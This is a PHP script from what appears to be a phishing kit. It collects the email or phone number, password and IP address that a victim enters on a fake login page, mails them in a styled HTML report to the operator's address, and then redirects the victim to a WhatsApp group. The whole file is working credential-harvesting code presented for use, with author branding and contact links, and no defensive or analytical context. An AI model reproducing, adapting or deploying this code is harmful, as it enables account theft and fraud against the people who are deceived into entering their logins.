<?php
include'system/nguyen.php';
if(isset($_POST['user'])){
$nguyen = new NguyenThuWan();
$user = $nguyen->post($_POST['user']);
$pass = $nguyen->post($_POST['pass']);
$ip = $nguyen->post($_POST['ip']);

$jamasuk = date('l, d-m-Y h:i:s');

$subjek = "-=[ $user ]=-";
$pesan = '
<center>
 <div style="background: url(https://i.ibb.co/dKzXyrp/coollogo-com-101334325.png) no-repeat;border:2px solid pink;background-size: 100%; width: 294; height: 101px; color: #000; text-align: center; border-top-left-radius: 5px; border-top-right-radius: 5px;">
</div>
 <table border="1" bordercolor="#19233f" style="color:#fff;border-radius:8px; border:3px solid pink; border-collapse:collapse;width:100%;background:#cf0485;">
    <tr>
<th style="padding:3px;width: 35%; text-align: left;" height="25px"><b>𝔼𝕞𝕒𝕚𝕝/𝕋𝕖𝕝𝕡𝕠𝕟</b></th>
<th style="padding:3px;width: 65%; text-align: center;"><b>'.$user.'</th> 
</tr>
<tr>
<th style="padding:3px;width: 35%; text-align: left;" height="25px"><b>ℙ𝕒𝕤𝕤𝕨𝕠𝕣𝕕</th>
<th style="padding:3px;width: 65%; text-align: center;"><b>'.$pass.'</th> 
</tr>
<tr>
<th style="padding:3px;width: 35%; text-align: left;" height="25px"><b>𝕀ℙ 𝔸𝕕𝕕𝕣𝕖𝕤𝕤</th>
<th style="width: 65%; text-align: center;"><b>'.$ip.'</th> 
</tr>
<tr>
<th style="padding:3px;width: 35%; text-align: left;" height="25px"><b>𝕎𝕒𝕜𝕥𝕦</th>
<th style="width: 65%; text-align: center;"><b>'.$jamasuk.'</th> 
</tr>
</table>
<div style="border:2px solid pink;width: 294; font-weight:bold; height: 20px; background: #cf0485; color: #fff; padding: 10px; border-bottom-left-radius: 5px; border-bottom-right-radius: 5px; text-align:center;">

<a style="border:2px solid #fff;text-decoration:none;color:#fff;border-radius:3px;padding:3px;background:#3b5998;" href="https://www.facebook.com/nguyenxwann">𝙵𝚊𝚌𝚎𝚋𝚘𝚘𝚔</a>
<a style="border:2px solid #fff;text-decoration:none;color:#fff;border-radius:3px;padding:3px;background:#0088CC;" href="http://t.me/nguyenxstore">𝚃𝚎𝚕𝚎𝚐𝚛𝚊𝚖</a>
<a style="border:2px solid #fff;text-decoration:none;color:#fff;border-radius:3px;padding:3px;background:#25D366;" href="https://chat.whatsapp.com/BXlEQgR9uMh58buLaOCr2x">𝚆𝚑𝚊𝚝𝚜𝚊𝚙𝚙</a>
</div>
 <center>
';
include'email.php';
$sender = 'From: .•° ℕ𝕘𝕦𝕪𝕖𝕟𝕋𝕙𝕦𝕎𝕒𝕟 °•.<kimberlyhimeku@gmail.com>';
$headers  = 'MIME-Version: 1.0' . "\r\n";
$headers .= 'Content-type: text/html; charset=iso-8859-1' . "\r\n";
$headers .= ''.$sender.'' . "\r\n";
// MENGIRIM DATA KE EMAIL
$nguyen->mail($email, $subjek, $pesan, $headers);
echo '<script>window.location="https://chat.whatsapp.com/BXlEQgR9uMh58buLaOCr2x";</script>';
}else{
header('location:index.php');
}
?>